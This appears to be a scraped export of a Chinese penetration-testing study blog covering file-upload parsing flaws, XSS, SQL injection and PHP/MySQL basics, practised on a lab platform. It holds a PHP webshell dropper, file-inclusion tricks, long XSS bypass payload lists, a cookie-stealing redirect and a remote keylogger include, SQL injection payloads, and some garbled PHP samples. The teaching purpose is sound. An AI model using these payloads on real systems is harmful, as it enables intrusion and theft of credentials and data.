xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞) 另外一种手法：上传一个名字为test.jpg，以下内容的文件。 &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 修复方案 1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;2.在Nginx配置文件中添加以下代码： 12345if ( $fastcgi_script_name ~ ..&#x2F;.php ) &#123;return 403;&#125; 这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。 .htaccess文件解析上传.htaccess文件 ，是将本文件夹中的所有文件用php来执行 也可以称为文件包含漏洞文件内容为： &lt;FilesMatch “”&gt;SetHandler application/x-httpd-php 本地文件包含解析文件包含漏洞的查找，当有源代码的时候可以直接查找，相关函数，当没有源代码的时候我们就需要手工包含别的文件来看看是否有包含漏洞。 文件包含有四个函数，遇到错误不会停止执行：include()、include_once() 遇到错误会停止执行：require()、ruquire_once() 我们一般使用include()和include_once() 需要我们把allow_url_include()设置为on状态、magic_quotes_gpc为off状态 （1）包含漏洞一般采用图片与文件一起上传，利用包含漏洞将图片中的一句话木马给解出来。（2）需要使用../来进行返回上一级目录，如果被过滤可以进行…/./进行过滤。（3）如果没有发现需要进行上传的漏洞，我们可以选择选择找到日志文件进行包含获取webshell，/apache/logs/access.log目录，但是目录前面的../需要自己构造。（4）文件包含读文件和写文件，这个都需要使用php协议读文件：php://filter/read=convert.base64-encode/resource= （使用base64加密防止报错）写文件：php://input 在post中提交（5）str_replace()函数，可以将http、https、../、..\\都替换为空或删除。我们需要使用hthttp://tp://和..././进行绕过，绝对路径也可以不会受影响。（6）fnmatch()函数，只允许include和file头进行访问我们可以使用file协议file://c:1.txt 这里绝对路径和../都支持。一般企业都使用这个函数进行过滤。 六、安全防范​ 针对文件上传漏洞的特点和必须具备的三个条件，我们阻断任何一个条件就可以达到组织文件上传攻击的目的： 1、最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性； 2、文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传）；此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码； 3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件； 4、单独设置文件服务器的域名；","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"XSS跨站脚本攻击","date":"2020-09-12T12:04:03.000Z","path":"2020/09/12/XSS跨站脚本攻击/","text":"xss总结图 xss攻击图 一、什么是 XSSXSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。 二、XSS漏洞出现的原因程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害. 三、XSS的危害1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。3、“框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。4、挂马（水坑攻击）5、有局限性的键盘记录 四、 XSS分类1、反射型XSS或不持久型XSS(中危)交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 12345678910111213payload&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;&#x2F;sCrIpT&gt;&lt;?php_GET[&#39;name&#39;];echo &quot;Welcome $name&quot;;?&gt; 2、储存型XSS 或持久型 XSS（高危）交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性 3、DOM XSS不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。https://www.w3school.com.cn/htmldom/index.asp&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;&lt;a href=&#39;#&#39; onclick=&quot;alert(2222)&quot;&gt;what do you see?&lt;/a&gt; 五、XSS可能存在的地方HTML contextAttribute ContextURL ContextStyle ContextScript Context 六、XSS测试方法1、工具扫描：APPscan、AWVS2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。（1）在目标站点上找到输入点,比如查询接口,留言板等;（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞; 七、实战1、xss平台搭建及后台使用（cookie获取）&#39;&quot;&gt;&lt;script&gt;document.location = &#39;http://192.168.0.113/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt; //通过document.location 实例进行重定向到http://127.0.0.1/pikachu/index.phpphp版本影响实验结果 2、反射型XSS(POST)获取用户密码post攻击利用页面 D:\\phpStudy\\WWW\\pikachu\\pkxss\\xcookie\\post.htmlhttp://192.168.0.113:80/post.html 3、xss钓鱼演示钓鱼攻击利用页面 E:\\phpStudy\\WWW\\pikachu\\pkxss\\xfish 4、xss获取键盘记录演示 (1)、什么是跨域 ​ http:// www. oldboyedu.com :80 / news/index.php 协议 子域名 主域名 端口资源地址 ​ 当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。 (2)、同源策略 ​ 为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象 ​ 那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。 Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的 &lt;script src=&quot;...&quot;&gt; //加载本地js执行 &lt;img src=&quot;C:/blog/source/_posts/...&quot;&gt; //图片 &lt;link href=&quot;...&quot;&gt; //css &lt;iframe src=&quot;...&quot;&gt; //任意资源 (3)、同源策略修改 ​ E:\\phpStudy\\WWW\\pikachu\\pkxss\\rkeypress\\rkserver.php ​ 同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。 (4）rk.js关键代码解读 ​ var realkey = String.fromCharCode(event.keyCode); //获取用户键盘记录，最后转化为字符串 ​ xl+=realkey; //赋值给x1 ​ show(); //调用show函数，通过下面ajax进行post发送键盘记录人内容 输入设置好的恶意JS代码： &lt;script src=&quot;http://192.168.3.60/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt; 然后在键盘上随意输入，就可以到xss平台上去查看键盘输入的结果 八、xss如何绕过及安全防范多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。 ​ xss绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。 （1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。 （2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。 例：&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; （3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。 例：&lt;sc&lt;script&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt; （4）使用注释来干扰后台对输入内容的识别。 例：&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt; （5）编码 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的） 例：使用事件属性onerror(): &lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt; ​ 使用HTML进行编码： ` &lt;img src=x onerror=”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”/&gt;` （6）样式绕过 `&lt;div style=”color: ‘&lt;’; color: expression(alert(‘XSS’))”&gt;` (7)XSS绕过之htmlspecialchars()函数 htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。yangshiy 预定义的字符是： &amp; (和号)成为 &amp;amp “ (双引号)成为 &amp;quot ’ (单引号)成为&amp;#039 &lt;(小于)成为 &amp;lt &gt;(大于)成为 &amp;gt 该函数的语法：htmlspecialchars(string,flags,character-set,double_encode) 过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号 可用的quotestyle类型： ENT_COMPAT - 默认。仅编码双引号 ENT_QUOTES - 编码双引号和单引号 ENT_NOQUOTES - 不编码任何引号 可使用以下语句绕过： q’ onclick=’alert(111)’ (8) xss之href输出绕过：javascript:alert(1111)直接代入a标签herf里面一样可以绕过htmlspecialchars (9) xss之js输出绕过：1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt; 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的） phpstudy配置伪静态 https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html 伪静态注入的总结 https://www.cnblogs.com/jsq16/p/5942003.html XSS盲打XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。例如输入： &#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; 管理员后台： http://http://192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php 跨站语句&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; 大小写绕过&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt; 过滤script绕过&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; 直接k掉script绕过&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt; 包含alert就绕过（括号一串数字是alert(xss)的ASCII值）&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 构造js绕过‘;alert(‘xss’);’ htmlentities没有过滤单引号，直接用单引号绕过。..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt; 当post 地址使用了当前url的时候，可这样绕过..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 通过构造一个带xss的锚点绕过&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;alert(1) 过chrome默认xss过滤器http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx %22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;%27%29%0D%0Aalert%28document.cookie%29%2F%2F &lt;script&gt;alert(&quot;跨站&quot;)&lt;/script&gt; (最常用）&lt;img scr=javascript:alert(&quot;跨站&quot;)&gt;&lt;/img&gt; http://www.example.com/MyApp.aspx?myvar= “&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(‘XSS’))&gt; &lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;“ onclick=”alert(1)”&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;&lt;img scr=&quot;javas????cript:alert(/跨站/)&quot; width=150&gt;&lt;/img&gt; (?用tab键弄出来的空格）&lt;img scr=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt; (/**/ 表示注释）&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;&lt;style&gt; input &#123;left:expression (alert(&#39;xss&#39;))&#125;&lt;/style&gt;&lt;div style=&#123;left:expression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;&lt;div style=&#123;left:exp/* */ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;&lt;div style=&#123;left:\\0065\\0078ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;html 实体 &lt;div style=&#123;left:&amp;#ｘ0065；xpression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;unicode &lt;div style=&quot;&#123;left:expRessioN (alert(&#39;xss&#39;))&#125;&quot;&gt; &quot;]&#125;%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E&#123;[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot; /peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2 Referer: &#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt; 传送头插入 /peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E /peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt; &lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; &lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; &lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; /user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e &lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;保存修改结果&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt; http://www.xx.com/netsearch_pre.jsp?netname=1&quot; onmouseenter=”prompt(/csits/) url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt; http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"PHP及mysql数据库","date":"2020-09-12T12:02:01.000Z","path":"2020/09/12/PHP及mysql数据库/","text":"mysql一、概述1.数据库的五个基本单位：数据库服务器，数据库，数据表，字段（数据列），数据行 2.数据库登录命令：mysql -h localhost -u root -p (-h 连接名，本地连接可以不写，-u 用户名， -p 用密码的方式登录) 3.数据库引擎：MyISAM与nnoDB区别： MyISAM：能更好的的用于查找，不支持事务。 nnoDB：更好的用于增删改，支持事务。 详细 ：https://www.cnblogs.com/vicenteforever/articles/1613119.html 4.常用的数据库编码 gbk–chinese–ci 简体中文，不区分大小。 uft8–general不区分大小写。 二、数据库定义语句（DDL） 创建数据库 create database 数据库名称;create database books; 查看数据库 show data 删除数据库 ​ drop database user; 创建数据表 use user; //使用数据库create table book (id int(20) primary key,bookname varchar(255),type varchar(255),information varchar(255))注：最后没有“,”,primary key 为主键 查看本数据库所有数据表 show tables; 查看表结构 desc user; 修改数据表 向数据表中添加新字段：alter table book add column ISDN int(20); 向数据表中删除字段：alter table book drop column ISDN; 修改数据表中字段的类型：alter table book modify column type int(200); 修改数据表中字段的名称及类型：alter table book change column type phone int(25); 删除数据表 drop table book; 查看数据库创建过程 show create database books; 查看表创建源码： show create table user； 三、数据库定义语言（DML）1.向数据表中插入数据insert into user (id,username,password,birthday) values(5,”qiqi”,123456,”1998.05.26”); 2.修改表中的数据update user set username=”zhao” where id=5; 3.删除表中的数据删除所有数据：delete from user； 四、权限操作 授予权限 grant 权限 on 库.表 to’用户‘@’主机’ identified by ‘密码’;示例 grant select, inserton test.* to ‘liwenkai’@’localhost’ identified by ‘4311’;示例说明 给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限。 删除权限 基本语法：revoke 权限 on 库.表 from ‘用户‘@’主机’;示例：revoke select ,insert on test.* from ‘liwenkai’@’localhost’; php一、基本语法1.定义 （$+有意义的名称）$shu初始化 $shu=10;//开始定义的时候赋值 2.可变变量$$+有意义名称； 1234567891011&lt;?p&#x2F;&#x2F;可变变量$shu&#x3D;&#39;biao&#39;;$biao&#x3D;&quot;鼠标&quot;;echo $$shu;?&gt; 3.注释单行注释：//单行注释：#多行注释：/* */ 4.数据类型整型： 12345678910111213141516171819202122&lt;?php&#x2F;&#x2F;整数类型 10进制，8进制，16进制int$int&#x3D;1000;echo $int;echo &#39;&lt;br&gt;&#39;;$int8&#x3D;01534;echo $int8;echo &#39;&lt;br&gt;&#39;;$int16&#x3D;0x1927fa;echo $int16;?&gt; bool类型：只有两个返回值：true ,false 1234567891011121314&lt;?php&#x2F;&#x2F;布尔类型bool$bool&#x3D;true;echo $bool;echo &#39;&lt;br&gt;&#39;;var_dump($bool);?&gt; str字符串类型： 12345678910111213141516&lt;?php&#x2F;&#x2F;字符串类型strstr1&#x3D;&#39;name,let\\&#39;s go&#39;;&#x2F;&#x2F;单引号中有符号，会被原样输出var_dump($str1);echo &#39;&lt;br&gt;&#39;;str2&#x3D;&quot;name,let&#39;s go&quot;;&#x2F;&#x2F;双引号中的符号，不会被原样输出，是变量的开始var_dump($str2);?&gt; 5.算数运算符 123456789101112131415161718&lt;?php&#x2F;&#x2F;算数运算符[Math Processing Error]x&#x3D;5;y&#x3D;10;echo [Math Processing Error]x+y;echo &#39;&lt;br&gt;&#39;;echo [Math Processing Error]x+&#x3D;y;&#x2F;&#x2F;x&#x3D;15echo &#39;&lt;br&gt;&#39;; echo [Math Processing Error]x++;&#x2F;&#x2F;x++是先输出再相加 echo &#39;&lt;br&gt;&#39;;echo ++[Math Processing Error]x; &#x2F;&#x2F;++x是先相加在输出echo &#39;&lt;br&gt;&#39;;echo [Math Processing Error]y % x;?&gt; 二、流程控制1.if else 选择结构 123456789101112131415161718&lt;?php&#x2F;&#x2F;if语句$po&#x3D;true;if($po)&#123; echo &#39;我愿意去学习！&#39;; &#125;else&#123; echo &#39;我不愿意去学习！&#39;;&#125; ?&gt; 2.switch case 语句 12345678910111213141516171819202122232425262728293031323334&lt;?php$tool&#x3D;rand(1,6);&#x2F;&#x2F;产生随机数的函数switch($tool)&#123;case 1:echo &#39;自己开车&#39;;break;case 2:echo &#39;骑自行车&#39;;break; case 3: &#x2F;&#x2F;选项块echo &#39;开小汽车&#39;;break; defined: &#x2F;&#x2F;都不选的时候执行的语句块echo &#39;不回家&#39;;&#125;?&gt;&#x2F;&#x2F;根据产生的随机数，选择不同模块 3.while循环语句 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; while循环语句$rom&#x3D;0;while($rom &lt;5)&#123; if($rom&#x3D;&#x3D;0)&#123; echo &#39;我刚进入循环&lt;br&gt;&#39;; &#125; else&#123; echo &#39;我循环了&#39;.$rom.&#39;次&lt;br&gt;&#39;; &#125; $rom++;&#125;echo &#39;while循环结束了&#39;;?&gt; 4.for循环语句 1234567891011121314&lt;?php&#x2F;&#x2F;for循环,foreach(数组1 as $value) 将数组赋值给valuefor (i&#x3D;1;i&lt;5;$i++)&#123; echo &#39;这是第&#39;.$i.&#39;次&lt;br&gt;&#39;;&#125;echo &#39;for循环结束&#39;;?&gt; 5.goto语句goto语句跳转之后会停止向下执行，直接执行跳转到的语句中继续执行 123456789101112131415161718&lt;?phpgoto wan;echo &#39;我就是我，我喜欢我自己&#39;;wan:echo &#39;你不能那么自私,你要爱大家！&lt;br&gt;&#39;;goto gril;gril:echo &#39;你还要爱你的女孩!&#39;;?&gt; 三、函数1.定义 1234567891011121314&lt;?php&#x2F;&#x2F;基本函数语法function love(i,l&#x3D;14)&#123; echo &#39;i love you &#39;.i.l;&#125;love(13);?&gt; 2.常用函数****数字函数 abs() 绝对值函数pow(-1,20) 返回-1的20次方min(1,2,3,4,5,6) 求这些数的最小值max() 返回最大值pi() 圆周率值count() 计算数量 ****字符串函数count_chars() 统计字符串中的所有字母 ****日期函数 12345678910111213141516171819202122232425262728&lt;?php$mytime &#x3D; getdate();echo &quot;年 :&quot;.$mytime[&#39;year&#39;].&quot;\\n&quot;;echo &quot;月 :&quot;.$mytime[&#39;mon&#39;].&quot;\\n&quot;;echo &quot;日 :&quot;.$mytime[&#39;mday&#39;].&quot;\\n&quot;;echo &quot;时 :&quot;.$mytime[&#39;hours&#39;].&quot;\\n&quot;;echo &quot;分 :&quot;.$mytime[&#39;minutes&#39;].&quot;\\n&quot;;echo &quot;秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;&lt;br&gt;&quot;;echo &quot;一个小时中的第几钟 :&quot;.$mytime[&#39;minutes&#39;].&quot;\\n&quot;;echo &quot;这是一分钟的第几秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;\\n&quot;;echo &quot;星期名称 :&quot;.$mytime[&#39;weekday&#39;].&quot;\\n&quot;;echo &quot;月份名称 :&quot;.$mytime[&#39;month&#39;].&quot;\\n&quot;;echo &quot;时间戳 :&quot;.$mytime[0].&quot;\\n&quot;;?&gt; 四、数组与数据结构12345678910111213141516171819202122232425262728293031323334&lt;?php&#x2F;&#x2F;数组与数据结构$shu&#x3D;array(1,1.5,20,true,&#39;我就是我，我爱我&#39;);var_dump($shu);echo &#39;&lt;br&gt;&#39;;&#x2F;&#x2F;区别echo $shu.&#39;&lt;br&gt;&#39;;$num&#x3D;array(1,2,3,4,5,6,7,8,9,10);echo $num[0].&#39;&lt;br&gt;&#39;;&#x2F;&#x2F;单个输出for (i&#x3D;0;i&lt;9;$i++)&#123;&#x2F;&#x2F;遍历数组 echo num[i].&#39;&lt;br&gt;&#39;;&#125;&#x2F;&#x2F;数组遍历元素$mingren &#x3D; array(&quot;邓超&quot;, &quot;黄晓明&quot;, &quot;宁泽涛&quot;, &quot;钟汉良&quot;);dc &#x3D; array_shift(mingren);echo $dc .&#39;&lt;br &#x2F;&gt;&#39;;print_r($mingren);?&gt; 五、正则表达式123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php&#x2F;&#x2F;php 正则表达式$zz &#x3D; &#39;&#x2F;w.+q&#x2F;&#39;;&#x2F;&#x2F;&#39;&#x2F;w.+q&#x2F;U&#39;为懒惰模式，输出结果为w_q$string &#x3D; &#39;sssssw__qqqqqqaaaaaa&#39;;if(preg_match(zz, string, $matches))&#123; echo &#39;匹配到了，结果为：&#39;; var_dump($matches); print_r( &#39;&lt;br&gt;&#39;.$matches);&#125;else&#123;&#125;?&gt;&lt;hr&gt;&#x2F;&#x2F;分割线符号&lt;?php$subject &#x3D; &quot;test__123123123&quot;;preg_match(&#39;&#x2F;test.+123&#x2F;&#39;, subject, matches); &#x2F;&#x2F;贪婪模式 var_dump($matches);preg_match(&#39;&#x2F;test.+123&#x2F;U&#39;, subject, matches); &#x2F;&#x2F;懒惰模式var_dump($matches);preg_filter(&#39;&#x2F;test.+123&#x2F;&#39;,subject,matches);var_dump($matches);&#x2F;&#x2F;匹配结果与懒惰模式一样，?&gt; 删除表中的某个字段：delete from user where id=5；","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"开发","slug":"开发","permalink":"https://zhangyanlady.github.io/tags/%E5%BC%80%E5%8F%91/"},{"name":"web","slug":"web","permalink":"https://zhangyanlady.github.io/tags/web/"},{"name":"面试","slug":"面试","permalink":"https://zhangyanlady.github.io/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"sql注入","date":"2020-09-12T12:01:26.000Z","path":"2020/09/12/sql注入/","text":"注入总结图 1.0 原理注入产生的原因是接受相关参数未经处理直接带入数据库查询操作 1.1 攻击条件 确定Web应用程序所使用的技术 可以考察Web页面的页脚 查看错误页面 检查页面源代码 使用诸如Nessus、AWVS、APPSCAN等工具来进行刺探 确定所有可能的输入方式 HTML表单 通过隐藏的HTML表单输入、HTTP头部、cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互M HTTP的GET和POST 查找可以用于注射的用户输入 多留意Web应用的错误页面 1.2 注入前的准备及注入漏洞检测 显示友好HTTP错误信息 取消IE浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息 打开IE浏览器，选择菜单“工具”一“Internet选项”命令，打开“Internet选项”对话框。打开“高级”选项卡，在“设置”列表框中找到“浏览组”，取消勾选“显示友好HTTP错误信息” 手工检测sql注入点 寻找如下形式的网页链接。（最常见） http://www.*****.com/***.asp?id=xx (ASP注入) http://www.*****.com/index.asp?id=8&amp;page=99 (注:注入的时候确认是id参数还是page参数，工具默认只对后面page参数注入，所以要对工具进行配置或者手工调换) 检测方法 “单引号”法 1=1和1=2法 1.3 注入分类 数字型(or 1=1) 通过burp抓包输入一个or 1=1设置一个payload,点击提交后，在Render中查看结果。通过判断存在SQL注入，且为数字型注入，可以通过拼接SQL语句来实现注入。 字符型(‘or 1=1#’) 在vince后面添加单引号来闭合vince，再在1=1后面添加注释#来消除掉后面的单引号，这样来完成一个SQL语句的拼接合法性。完整的语句为select id,email from member where username=’vince‘ or 1=1#’；我们回到pikachu平台输入vince‘ or 1=1# 搜索型(%xxxx%’or 1=1 #%’) 将拼接语句写为%xxxx%’or 1=1 #%’ xx型(XX’) or 1=1#) XX型是由于SQL语句拼接方式不同 拼接语句写为XX’) or 1=1# 1.4 注入提交方式ASP：request （全部接受）、request.querystring （接受get）、request.form （接受post）、 request.cookie cookie （接受cookie） PHP: $_REQUEST（全部接受）、$_GET $_POST （接受post）、$_COOKIE（接受cookie） 1.5 注入攻击类型与方式 union注入 union操作符用于合并两个或多个SQL语句集合起来，得到联合的查询结果 select id,email from member where username=’kevin’ union select username,pw from member where id=1; 注：union操作符一般与order by语句配合使用 输入a’ order by 3#% ，通过这个简单的办法找到主查询一共有三个字段 之后我们来使用union来做一个SQL语句的拼接。输入构造好的语句a’ union select database(),user(),version()#% information_schema注入 information_schema数据库是MySQL系统自带的数据库 通过information_schema注入，我们可以将整个数据库内容全部窃取出来, 使用order by来判断查询的字段 找出数据库的名称，输入vince’ union select database(),user(),3#% 获取pikachu数据库的表名，输入:u’ union select table_schema ,table_name,3 from information_schema.tables where table_schema=’pikachu’# 获取pikachu数据库的字段名，输入： k’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’#% 最后获取字段值的内容，输入：kobe’union select username ,password,3 from users#% 基于函数的报错 条件：后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端 三个常用的用来报错的函数 updatexml（）:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数. 1、爆数据库版本信息 k’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # 